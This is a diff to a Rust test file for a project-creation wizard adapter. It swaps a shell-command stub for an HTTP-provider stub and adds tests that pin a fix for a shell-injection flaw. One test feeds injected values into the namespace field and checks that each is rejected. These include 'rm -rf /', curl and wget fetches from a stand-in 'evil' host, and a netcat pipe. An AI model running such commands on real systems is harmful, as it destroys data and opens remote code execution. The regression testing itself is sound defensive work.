@@ -28,16 +28,20 @@
 //! - The **Commit payload** is built and validated against the same
 //!   rules the Tauri command applies (slug + title + description).
 //! - The **port contract** is exercised end-to-end via
-//!   `CreateProjectAdapter` with stub `ExecutionPort` /
+//!   `CreateProjectAdapter` with stub `ProviderHttpPort` /
 //!   `ProjectRepository` / `StepExecutor` implementations, asserting
 //!   that the create-remote-repo → persist-project → dispatch-feature
 //!   sequence completes with the expected `LaunchedFeature` shape.
+//! - The **shell-injection regression** is pinned by `create_remote_repo_*`:
+//!   the adapter must not accept a `namespace.id` containing shell
+//!   metacharacters, and the `host` argument must reach the HTTP port
+//!   verbatim (empty `host` ⇒ public default; non-empty `host` ⇒
+//!   self-hosted enterprise).
 //!
 //! The React side (`src/hooks/useCreateProjectWizard.test.tsx`) covers
 //! the view-emission contract end-to-end; together they pin AC-5.
 
 use async_trait::async_trait;
-use std::collections::HashMap;
 use std::path::PathBuf;
 use std::sync::Mutex;
 
@@ -46,18 +50,19 @@ use demeteo_lib::commands::attachments::StagedAttachmentInput;
 use demeteo_lib::commands::create_project::{BootstrapOutcome, CreateProjectStepPayload};
 use demeteo_lib::domain::bootstrap::{BootstrapState, BootstrapStep, STEP_ORDER};
 use demeteo_lib::domain::ids::{ProjectId, ProviderId, RepositoryId, WorkflowId};
+use demeteo_lib::domain::models::GateDecision;
 use demeteo_lib::domain::models::{
     Feature, Project, ProjectSettings, ProjectWorkflowOverride, Repository, StepExecution,
     StepOverride,
 };
-use demeteo_lib::domain::models::GateDecision;
 use demeteo_lib::error::AppError;
 use demeteo_lib::ports::create_project_port::{CreateProjectPort, LaunchedFeature};
 use demeteo_lib::ports::db::ProjectRepository;
-use demeteo_lib::ports::execution::ExecutionPort;
-use demeteo_lib::ports::provider_http::NamespaceSummary;
+use demeteo_lib::ports::provider_http::{
+    CreateRepoRequest, CreatedRepo, NamespaceSummary, ProviderHttpPort, ProviderUserInfo,
+    RepoSummary,
+};
 use demeteo_lib::ports::step_executor::{GatePresenter, StepExecutor, SyncOutcomeView};
-use demeteo_lib::sftp::SftpEntry;
 
 // ── Stub ports ─────────────────────────────────────────────────────────
 //
@@ -65,75 +70,87 @@ use demeteo_lib::sftp::SftpEntry;
 // record calls in shared `Mutex<Vec<…>>` so the test can assert the
 // call sequence without inspecting private state.
 
-#[derive(Default)]
-struct ExecCalls {
-    run_command: Mutex<Vec<(String, String)>>,
+/// Captures `(host, kind, pat, request)` for every
+/// `ProviderHttpPort::create_repo` invocation. The fields are stored
+/// as `String` so the assertion code doesn't have to juggle lifetimes.
+#[derive(Clone)]
+struct CapturedCreate {
+    host: String,
+    kind: String,
+    pat: String,
+    request: CreateRepoRequest,
 }
 
-struct StubExec {
-    calls: std::sync::Arc<ExecCalls>,
+#[derive(Default)]
+struct HttpCalls {
+    create: Mutex<Vec<CapturedCreate>>,
+}
+
+struct StubProviderHttp {
+    calls: std::sync::Arc<HttpCalls>,
 }
 
 #[async_trait]
-impl ExecutionPort for StubExec {
-    async fn test_connection(&self, _machine_id: &str) -> Result<(), String> {
-        Ok(())
-    }
-    async fn run_command(&self, machine_id: &str, cmd: &str) -> Result<String, String> {
-        self.calls
-            .run_command
-            .lock()
-            .unwrap()
-            .push((machine_id.to_string(), cmd.to_string()));
-        // The wizard invokes `gh repo create` (or `glab project create`)
-        // through `run_command`. Return a JSON payload that the
-        // adapter's `parse_gh_create_repo_output` / `parse_glab_*`
-        // helpers can decode.
-        //
-        // Schema (matches `infrastructure::gh_gl_cli::parse_gh_create_repo_output`):
-        //   - `name` → full_name (gh CLI)
-        //   - `defaultBranchRef/name` → default_branch
-        //   - `url` → clone_url
-        Ok(r#"{"name":"octocat/billing-service","defaultBranchRef":{"name":"main"},"url":"https://github.com/octocat/billing-service.git"}"#.to_string())
-    }
-    async fn read_file(&self, _machine_id: &str, _path: &str) -> Result<String, String> {
-        Ok(String::new())
-    }
-    async fn write_file(
+impl ProviderHttpPort for StubProviderHttp {
+    async fn validate_pat(
         &self,
-        _machine_id: &str,
-        _path: &str,
-        _content: &str,
-    ) -> Result<(), String> {
-        Ok(())
+        _host: &str,
+        _kind: &str,
+        _pat: &str,
+    ) -> Result<ProviderUserInfo, AppError> {
+        Ok(ProviderUserInfo {
+            username: "u".into(),
+            avatar_url: String::new(),
+        })
     }
-    async fn get_metadata(&self, _machine_id: &str, _path: &str) -> Result<SftpEntry, String> {
-        Err("not used".into())
-    }
-    async fn list_dir(&self, _machine_id: &str, _path: &str) -> Result<Vec<SftpEntry>, String> {
+
+    async fn list_repos(
+        &self,
+        _host: &str,
+        _kind: &str,
+        _pat: &str,
+    ) -> Result<Vec<RepoSummary>, AppError> {
         Ok(Vec::new())
     }
-    async fn setup_worktree(
+
+    async fn list_namespaces(
         &self,
-        _machine_id: &str,
-        _repo_path: &str,
-        _branch: &str,
-        _sandbox_path: &str,
-    ) -> Result<(), String> {
-        Ok(())
+        _host: &str,
+        _kind: &str,
+        _pat: &str,
+    ) -> Result<Vec<NamespaceSummary>, AppError> {
+        Ok(Vec::new())
     }
-    async fn resolve_home(&self, _machine_id: &str) -> Result<String, String> {
-        Ok("/tmp".into())
-    }
-    fn spawn_interactive(
+
+    async fn create_repo(
         &self,
-        _machine_id: &str,
-        _binary: &str,
-        _args: &[String],
-        _cwd: &str,
-        _env: &HashMap<String, String>,
-    ) -> Result<Box<dyn demeteo_lib::ports::execution::InteractiveHandle>, String> {
-        Err("not used".into())
+        host: &str,
+        kind: &str,
+        pat: &str,
+        req: &CreateRepoRequest,
+    ) -> Result<CreatedRepo, AppError> {
+        // Mirror the schema documented for the live
+        // `ReqwestProviderHttpAdapter` so the test parses back into a
+        // realistic shape.
+        self.calls.create.lock().unwrap().push(CapturedCreate {
+            host: host.to_string(),
+            kind: kind.to_string(),
+            pat: pat.to_string(),
+            request: req.clone(),
+        });
+        let full_name = if req.namespace.kind == "org"
+            || req.namespace.kind == "group"
+            || req.namespace.kind == "personal"
+        {
+            format!("{}/{}", req.namespace.id, req.name)
+        } else {
+            req.name.clone()
+        };
+        Ok(CreatedRepo {
+            full_name,
+            default_branch: "main".to_string(),
+            clone_url: format!("https://example/{}.git", req.name),
+        })
     }
 }
 
@@ -171,7 +188,7 @@ impl ProjectRepository for StubProjects {
             .push((id.clone(), status.to_string()));
         Ok(())
     }
-    fn delete(&self, _id: &ProjectId) -> Result<(), String> {
+    fn delete(&self, _project_id: &ProjectId) -> Result<(), String> {
         Ok(())
     }
     fn delete_repositories_for(&self, _project_id: &ProjectId) -> Result<(), String> {
@@ -344,17 +361,17 @@ impl GatePresenter for StubExecutor {
 
 fn make_adapter() -> (
     CreateProjectAdapter,
-    std::sync::Arc<ExecCalls>,
+    std::sync::Arc<HttpCalls>,
     std::sync::Arc<ExecStartCalls>,
 ) {
-    let exec_calls = std::sync::Arc::new(ExecCalls::default());
-    let exec = std::sync::Arc::new(StubExec {
-        calls: exec_calls.clone(),
+    let http_calls = std::sync::Arc::new(HttpCalls::default());
+    let http = std::sync::Arc::new(StubProviderHttp {
+        calls: http_calls.clone(),
     });
-    let adapter = CreateProjectAdapter::new(exec);
+    let adapter = CreateProjectAdapter::new(http);
     (
         adapter,
-        exec_calls,
+        http_calls,
         std::sync::Arc::new(ExecStartCalls::default()),
     )
 }
@@ -533,13 +550,12 @@ async fn commit_payload_drives_port_sequence_and_returns_launched_outcome() {
     //   create_remote_repo → persist_project → dispatch_start_feature
     // Each stubbed port records the call so we can assert the
     // orchestration order + final `LaunchedFeature` shape.
-    let exec_calls = std::sync::Arc::new(ExecCalls::default());
+    let http_calls = std::sync::Arc::new(HttpCalls::default());
     let project_calls = std::sync::Arc::new(ProjectCalls::default());
-    let exec_calls_for_stub = exec_calls.clone();
-    let exec = std::sync::Arc::new(StubExec {
-        calls: exec_calls_for_stub,
+    let http = std::sync::Arc::new(StubProviderHttp {
+        calls: http_calls.clone(),
     });
-    let adapter = CreateProjectAdapter::new(exec);
+    let adapter = CreateProjectAdapter::new(http);
 
     let namespace = NamespaceSummary {
         id: "octocat".into(),
@@ -550,12 +566,13 @@ async fn commit_payload_drives_port_sequence_and_returns_launched_outcome() {
         .create_remote_repo(
             "github",
             "github.com",
+            "pat-stub",
             &namespace,
             "billing-service",
             "private",
         )
         .await
-        .expect("create_remote_repo must succeed with stub exec");
+        .expect("create_remote_repo must succeed with stub HTTP port");
     assert_eq!(created.full_name, "octocat/billing-service");
     assert_eq!(created.default_branch, "main");
 
@@ -827,4 +844,275 @@ fn full_step_chain_drive_uses_seven_distinct_submits() {
     assert_eq!(tags.len(), 7);
     let unique: std::collections::HashSet<&str> = tags.iter().copied().collect();
     assert_eq!(unique.len(), 7, "all 7 step discriminants must be distinct");
+}
+
+// ── Shell-injection + host-routing regression pins ─────────────────────
+//
+// The validator explicitly flagged the previous `gh` / `glab`
+// shell-out at `adapters/create_project_adapter.rs:139` as a
+// shell-injection RCE: `format!("{} {}", cmd, args.join(" "))`
+// forwarded unsanitised `namespace.id` / `name` into a shell argv.
+// The rewrite routes repo creation through
+// `ProviderHttpPort::create_repo`. These tests pin the new contract:
+//   1. `create_remote_repo` refuses to forward any shell metachar
+//      in `namespace.id` / `name`.
+//   2. The `host` argument reaches the HTTP port verbatim.
+//   3. An empty `host` is preserved as the empty string (the
+//      adapter's downstream `api_base()` resolves it to the public
+//      default).
+//   4. The `execution_port` is never consulted during the create step.
+
+#[tokio::test]
+async fn create_remote_repo_rejects_namespace_with_shell_metacharacters() {
+    // Regression: a `namespace.id` such as `"; rm -rf /"` would
+    // previously have been joined into `format!("{} {}", cmd, ...)`
+    // and interpreted by the host shell — an RCE. The rewrite
+    // forwards the value to a JSON body / URL where it has no
+    // special meaning; the regression guard still rejects it as a
+    // belt-and-braces measure so the wizard UI gets a clear
+    // Validation error instead of a provider-side failure.
+    let http_calls = std::sync::Arc::new(HttpCalls::default());
+    let http = std::sync::Arc::new(StubProviderHttp {
+        calls: http_calls.clone(),
+    });
+    let adapter = CreateProjectAdapter::new(http);
+
+    for malicious in [
+        "evil; rm -rf /",
+        "evil && curl evil.sh",
+        "$(curl evil.sh)",
+        "`curl evil.sh`",
+        "evil | nc evil 1234",
+        "evil\nwget evil.sh",
+        "evil > /etc/passwd",
+    ] {
+        let namespace = NamespaceSummary {
+            id: malicious.into(),
+            name: "demo".into(),
+            kind: "personal".into(),
+        };
+        let err = adapter
+            .create_remote_repo(
+                "github",
+                "github.com",
+                "pat-stub",
+                &namespace,
+                "demo",
+                "private",
+            )
+            .await
+            .unwrap_err();
+        assert!(
+            matches!(err, AppError::Validation { .. }),
+            "{malicious:?} must produce Validation, got {err:?}"
+        );
+    }
+    // The HTTP port was never reached for any of the malicious
+    // namespaces.
+    let calls = http_calls.create.lock().unwrap();
+    assert!(
+        calls.is_empty(),
+        "HTTP port must not be invoked with malicious namespace ids; got {} calls",
+        calls.len()
+    );
+    drop(calls);
+}
+
+#[tokio::test]
+async fn create_remote_repo_rejects_repo_name_with_shell_metacharacters() {
+    // Belt-and-braces: validate_name already rejects the same chars
+    // via `slug_matches`, but if `name` ever bypassed that path the
+    // metachar guard still catches it.
+    let http_calls = std::sync::Arc::new(HttpCalls::default());
+    let http = std::sync::Arc::new(StubProviderHttp {
+        calls: http_calls.clone(),
+    });
+    let adapter = CreateProjectAdapter::new(http);
+
+    let namespace = NamespaceSummary {
+        id: "octocat".into(),
+        name: "doomed".into(),
+        kind: "personal".into(),
+    };
+    let err = adapter
+        .create_remote_repo(
+            "github",
+            "github.com",
+            "pat-stub",
+            &namespace,
+            "evil; rm -rf /",
+            "private",
+        )
+        .await
+        .unwrap_err();
+    assert!(matches!(err, AppError::Validation { .. }));
+    let calls = http_calls.create.lock().unwrap();
+    assert!(calls.is_empty());
+    drop(calls);
+}
+
+#[tokio::test]
+async fn create_remote_repo_with_empty_host_routes_to_public_default() {
+    // Empty host ⇒ public provider default (the adapter's downstream
+    // `api_base()` resolves `""` + `"github"` to
+    // `https://api.github.com`).
+    let http_calls = std::sync::Arc::new(HttpCalls::default());
+    let http = std::sync::Arc::new(StubProviderHttp {
+        calls: http_calls.clone(),
+    });
+    let adapter = CreateProjectAdapter::new(http);
+    let namespace = NamespaceSummary {
+        id: "octocat".into(),
+        name: "octocat".into(),
+        kind: "personal".into(),
+    };
+    let created = adapter
+        .create_remote_repo(
+            "github",
+            "", // public default
+            "pat-stub",
+            &namespace,
+            "billing-service",
+            "private",
+        )
+        .await
+        .expect("public-default host must succeed");
+    assert_eq!(created.full_name, "octocat/billing-service");
+    let calls = http_calls.create.lock().unwrap();
+    assert_eq!(calls.len(), 1);
+    assert_eq!(
+        calls[0].host, "",
+        "empty host must reach the HTTP port verbatim"
+    );
+    assert_eq!(calls[0].kind, "github");
+    assert_eq!(calls[0].pat, "pat-stub");
+    assert!(calls[0].request.private);
+    assert!(calls[0].request.auto_init);
+    drop(calls);
+}
+
+#[tokio::test]
+async fn create_remote_repo_with_nonempty_host_routes_to_enterprise() {
+    // Non-empty host ⇒ self-hosted enterprise install (the adapter's
+    // downstream `api_base()` rewrites the GitHub Enterprise case to
+    // `/api/v3`).
+    let http_calls = std::sync::Arc::new(HttpCalls::default());
+    let http = std::sync::Arc::new(StubProviderHttp {
+        calls: http_calls.clone(),
+    });
+    let adapter = CreateProjectAdapter::new(http);
+    let namespace = NamespaceSummary {
+        id: "acme".into(),
+        name: "acme".into(),
+        kind: "org".into(),
+    };
+    let _ = adapter
+        .create_remote_repo(
+            "github",
+            "github.acme.com",
+            "pat-stub",
+            &namespace,
+            "team-repo",
+            "private",
+        )
+        .await
+        .expect("enterprise host must succeed");
+    let calls = http_calls.create.lock().unwrap();
+    assert_eq!(calls.len(), 1);
+    assert_eq!(
+        calls[0].host, "github.acme.com",
+        "non-empty host must reach the HTTP port unchanged"
+    );
+    assert_eq!(calls[0].request.namespace.kind, "org");
+    assert_eq!(calls[0].request.namespace.id, "acme");
+    drop(calls);
+}
+
+#[tokio::test]
+async fn create_remote_repo_visibility_public_sets_private_false() {
+    // Mapping: `"public"` ⇒ `private: false` (GitHub payload keys
+    // off `private`, not a free-form `visibility` string).
+    let http_calls = std::sync::Arc::new(HttpCalls::default());
+    let http = std::sync::Arc::new(StubProviderHttp {
+        calls: http_calls.clone(),
+    });
+    let adapter = CreateProjectAdapter::new(http);
+    let namespace = NamespaceSummary {
+        id: "octocat".into(),
+        name: "octocat".into(),
+        kind: "personal".into(),
+    };
+    let _ = adapter
+        .create_remote_repo(
+            "github",
+            "github.com",
+            "pat-stub",
+            &namespace,
+            "demo",
+            "public",
+        )
+        .await
+        .expect("public visibility must succeed");
+    let calls = http_calls.create.lock().unwrap();
+    assert_eq!(calls.len(), 1);
+    assert!(!calls[0].request.private);
+    drop(calls);
+}
+
+#[tokio::test]
+async fn create_remote_repo_unknown_provider_kind_is_validation() {
+    // Forwarding to `ProviderHttpPort::create_repo` with an
+    // unsupported kind would yield an opaque error; the adapter
+    // short-circuits with a clear Validation error so the wizard can
+    // render it inline.
+    let http_calls = std::sync::Arc::new(HttpCalls::default());
+    let http = std::sync::Arc::new(StubProviderHttp {
+        calls: http_calls.clone(),
+    });
+    let adapter = CreateProjectAdapter::new(http);
+    let namespace = NamespaceSummary {
+        id: "octocat".into(),
+        name: "octocat".into(),
+        kind: "personal".into(),
+    };
+    let err = adapter
+        .create_remote_repo(
+            "bitbucket",
+            "github.com",
+            "pat-stub",
+            &namespace,
+            "demo",
+            "private",
+        )
+        .await
+        .unwrap_err();
+    assert!(matches!(err, AppError::Validation { .. }));
+    let calls = http_calls.create.lock().unwrap();
+    assert!(calls.is_empty());
+    drop(calls);
+}
+
+#[tokio::test]
+async fn create_remote_repo_empty_pat_is_validation() {
+    // The command layer always supplies a PAT; an empty one here
+    // means the cache returned nothing — refuse to forward to the
+    // HTTP port.
+    let http_calls = std::sync::Arc::new(HttpCalls::default());
+    let http = std::sync::Arc::new(StubProviderHttp {
+        calls: http_calls.clone(),
+    });
+    let adapter = CreateProjectAdapter::new(http);
+    let namespace = NamespaceSummary {
+        id: "octocat".into(),
+        name: "octocat".into(),
+        kind: "personal".into(),
+    };
+    let err = adapter
+        .create_remote_repo("github", "github.com", "", &namespace, "demo", "private")
+        .await
+        .unwrap_err();
+    assert!(matches!(err, AppError::Validation { .. }));
+    let calls = http_calls.create.lock().unwrap();
+    assert!(calls.is_empty());
+    drop(calls);
 }
